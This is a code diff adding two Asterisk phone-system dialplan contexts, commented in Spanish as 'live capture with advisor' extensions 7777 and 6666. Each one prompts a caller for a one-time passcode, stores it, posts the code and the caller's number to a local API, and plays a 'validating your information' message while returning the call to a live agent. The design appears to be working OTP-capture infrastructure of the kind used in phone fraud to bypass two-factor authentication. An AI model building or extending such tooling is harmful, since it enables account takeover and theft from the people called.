@@ -333,6 +333,70 @@ exten => s,1,NoOp(Ejecutando captura OTP via Dialplan nativo Read())
  same => n(block_call),NoOp(Intentos de OTP agotados)
  same => n,Playback(custom/intentos_agotados_bloqueo)
  same => n,Hangup()
+
+; ------------------------------------------------------------------------------
+; 3. MOTOR DE CAPTURA EN VIVO CON ASESOR (EXTENSION 7777 / 777)
+; ------------------------------------------------------------------------------
+[ivr-captura-vivo]
+exten => s,1,Goto(ivr-otp-live-7777,s,1)
+
+[ivr-otp-live-7777]
+exten => s,1,NoOp(=== CAPTURA EN VIVO EXT 7777: Esperando ingreso de codigo ===)
+ same => n,Answer()
+ same => n,Wait(0.3)
+ same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})
+ same => n,Set(RETRY_COUNT=0)
+ same => n(pedir_codigo_7777),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])
+ same => n,Set(USER_DIGITS=)
+ same => n,Read(USER_DIGITS,custom/solicitar_codigo_otp,10,,2,15)
+ same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo_7777)
+ same => n,Playback(beep)
+ same => n,Read(USER_DIGITS,beep,10,,2,8)
+ same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo_7777)
+ same => n,GotoIf($[\${RETRY_COUNT} < 2]?pedir_codigo_7777)
+ same => n,NoOp(Sin digitos en 7777 -> Regresando llamada al asesor \${FINAL_AGENT})
+ same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)
+ same => n,Hangup()
+ same => n(evaluar_codigo_7777),NoOp(Codigo ingresado en 7777: \${USER_DIGITS})
+ same => n,Set(DB(otp_codes/7777)=\${USER_DIGITS})
+ same => n,Set(DB(otp_status/7777)=pending)
+ same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${CALLERID(num)}&otp=\${USER_DIGITS}&status=pending" &)
+ same => n,Playback(custom/un_momento_validando_informacion)
+ same => n,Wait(2)
+ same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)
+ same => n,Hangup()
+
+; ------------------------------------------------------------------------------
+; 4. MOTOR DE CAPTURA EN VIVO CON ASESOR (EXTENSION 6666 / 666)
+; ------------------------------------------------------------------------------
+[ivr-captura-vivo-6666]
+exten => s,1,Goto(ivr-otp-live-6666,s,1)
+
+[ivr-otp-live-6666]
+exten => s,1,NoOp(=== CAPTURA EN VIVO EXT 6666: Esperando ingreso de codigo ===)
+ same => n,Answer()
+ same => n,Wait(0.3)
+ same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})
+ same => n,Set(RETRY_COUNT=0)
+ same => n(pedir_codigo_6666),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])
+ same => n,Set(USER_DIGITS=)
+ same => n,Read(USER_DIGITS,custom/solicitar_codigo_otp,10,,2,15)
+ same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo_6666)
+ same => n,Playback(beep)
+ same => n,Read(USER_DIGITS,beep,10,,2,8)
+ same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo_6666)
+ same => n,GotoIf($[\${RETRY_COUNT} < 2]?pedir_codigo_6666)
+ same => n,NoOp(Sin digitos en 6666 -> Regresando llamada al asesor \${FINAL_AGENT})
+ same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)
+ same => n,Hangup()
+ same => n(evaluar_codigo_6666),NoOp(Codigo ingresado en 6666: \${USER_DIGITS})
+ same => n,Set(DB(otp_codes/6666)=\${USER_DIGITS})
+ same => n,Set(DB(otp_status/6666)=pending)
+ same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${CALLERID(num)}&otp=\${USER_DIGITS}&status=pending" &)
+ same => n,Playback(custom/un_momento_validando_informacion)
+ same => n,Wait(2)
+ same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)
+ same => n,Hangup()
 `;
 }
 
